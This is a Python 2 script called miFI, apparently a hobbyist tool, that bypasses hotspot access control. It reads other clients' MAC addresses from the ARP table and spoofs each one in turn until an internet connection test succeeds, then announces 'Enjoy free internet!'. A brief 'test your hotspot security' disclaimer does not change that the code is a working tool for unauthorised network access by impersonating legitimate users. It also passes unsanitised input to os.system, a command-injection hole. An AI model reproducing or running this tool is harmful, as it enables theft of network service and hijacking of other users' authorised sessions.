#Version 1.0 Alpha, If u find a bug report it to me on twitter @Arm4x

import os
import httplib
import socket
import sys
import time

def my_split(s, seps):
    res = [s]
    for sep in seps:
        s, res = res, []
        for seq in s:
            res += seq.split(sep)
    return res

if not 'SUDO_UID' in os.environ.keys():
    print "this program requires super user priv."
    print "run like this: sudo python miFI.py"
    sys.exit(1)

try:
    with open('ORIGINALMAC'):
        print
except IOError:
    print 'OriginalMAC file not found... creating it!'
    os.system("ifconfig en1 | grep ether > ORIGINALMAC")

originalMAC = open('ORIGINALMAC')
om = originalMAC.read().split("	ether ")

print 'Welcome to miFI Alpha 1.0'
print 'Developed by @Arm4x follow me on twitter ;D'
print
print 'Use this tool only for test your hotspot security'
print
print '1) Automatic mode'
print '2) Automatic mode LOOP #loop scan and spoof until connected!'
print '3) Scan WIFI for MAC address'
print '4) Scan WIFI for MAC address LOOP'
print '5) Spoof a MAC address'
print '6) Restore MAC address'
print '7) View current MAC address'
print '8) Test internet connection'
print
option = input('Select an option: ')

if option == 1:
    print 'Starting scan...'
    print
    os.system('arp -a > maclist')
    maclist = open('maclist')
    ml = maclist.read().split("\n")
    i = 0
    
    print 'Founded: ' + str(len(ml)) + ' MAC address'
    while i < len(ml):
        print ml[i]
        i = i + 1
    
    print
    print 'Searching for a working MAC to spoof...'
    i = 0
    while i < (len(ml) - 1):
        
        vett = my_split(ml[i], ['? (', ') at ', ' on en1 ifscope [ethernet]'])
        
        print 'IP: ' + vett[1] + ' MAC: ' + vett[2]

        ip = vett[1]
        mac = vett[2]
        
        if ip == '192.168.1.1':
            print 'Router ip! going to the next...'
        elif ip == '192.168.1.255':
            print 'Broadcast address! going to the next...'
        else:
            print 'Spoofing MAC: ' + mac
            os.system("ifconfig en1 ether " + mac)
            print 'MAC address spoofed!'
            print 'Testing connection...'
            test_con_url = "www.google.com"
            test_con_resouce = "/intl/en/policies/privacy/"
            test_con = httplib.HTTPConnection(test_con_url)

            try:
                test_con.request("GET", test_con_resouce)
                response = test_con.getresponse()
            except httplib.ResponseNotReady as e:
                print "Improper connection state"
            except socket.gaierror as e:
                print "Not connected"
            else:
                print "Connected! Enjoy free internet!"
                i = len(ml) - 1
            test_con.close()
        i = i + 1

if option == 2:
    connected = 0
    while connected == 0:
        print 'Starting scan...'
        print
        os.system('arp -a > maclist')
        maclist = open('maclist')
        ml = maclist.read().split("\n")
        i = 0
    
        print 'Founded: ' + str(len(ml)-1) + ' MAC address'
        while i < len(ml):
            print ml[i]
            i = i + 1
    
        print
        print 'Searching for a working MAC to spoof...'
        i = 0
        while i < (len(ml) - 1):
        
            vett = my_split(ml[i], ['? (', ') at ', ' on en1 ifscope [ethernet]'])
        
            print 'IP: ' + vett[1] + ' MAC: ' + vett[2]
        
            ip = vett[1]
            mac = vett[2]
        
            if (ip == '192.168.1.1' or ip == '192.168.182.1'):
                print 'Router ip! going to the next...'
            elif ip == '192.168.1.255':
                print 'Broadcast address! going to the next...'
            else:
                print 'Spoofing MAC: ' + mac
                os.system("ifconfig en1 ether " + mac)
                print 'MAC address spoofed!'
                print 'Testing connection...'
                test_con_url = "www.google.com"
                test_con_resouce = "/intl/en/policies/privacy/"
                test_con = httplib.HTTPConnection(test_con_url)
            
                try:
                    test_con.request("GET", test_con_resouce)
                    response = test_con.getresponse()
                except httplib.ResponseNotReady as e:
                    print "Improper connection state"
                except socket.gaierror as e:
                    print "Not connected"
                else:
                    print "Connected! Enjoy free internet!"
                    i = len(ml) - 1
                    connected = 1
                test_con.close()
            print '\n----------------------------------------------------\n'
            i = i + 1

if option == 3:
    print 'Starting scan...'
    print
    os.system('arp -a > maclist')
    maclist = open('maclist')
    ml = maclist.read().split("\n")
    i = 0
    
    print 'Founded: ' + str(len(ml)-1) + ' MAC address'
    while i < len(ml):
        print ml[i]
        i = i + 1

if option == 4:
    os.system("clear")
    print 'Starting scan...'
    print
    sec = 0
    while True:
        os.system('arp -a > maclist')
        maclist = open('maclist')
        ml = maclist.read().split("\n")
        i = 0
        print 'Scanning... Loop n:  ' + str(sec)
        print 'Founded: ' + str(len(ml)-1) + ' MAC address'
        while i < len(ml):
            print ml[i]
            i = i + 1
        sec = sec + 1
        time.sleep(1)
        os.system("clear")

if option == 5:
    mac = raw_input("Insert a MAC address to spoof: ")
    os.system("ifconfig en1 ether " + mac)

if option == 6:
    print 'Original MAC address from config is: ' + om[1]
    os.system("ifconfig en1 ether " + om[1])
    print 'Original MAC address restored!'

if option == 7:
    os.system("ifconfig en1 | grep ether")

if option == 8:
    print 'Testing connection...'
    test_con_url = "www.google.com"
    test_con_resouce = "/intl/en/policies/privacy/"
    test_con = httplib.HTTPConnection(test_con_url)
        
    try:
        test_con.request("GET", test_con_resouce)
        response = test_con.getresponse()
    except httplib.ResponseNotReady as e:
        print "Improper connection state"
    except socket.gaierror as e:
        print "Not connected"
    else:
        print "Connected!"
        connected = 1
    test_con.close()

